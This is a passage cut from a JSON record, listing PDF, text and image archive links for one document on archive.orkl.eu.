        "pdf": "https://archive.orkl.eu/ab3211cc642317a62c5330b640f24f08c3efb090.pdf",
        "text": "https://archive.orkl.eu/ab3211cc642317a62c5330b640f24f08c3efb090.txt",
        "img": "https://archive.orkl.eu/ab3211cc642317a62c5330b640f24f08c3efb090.jpg"
    }
}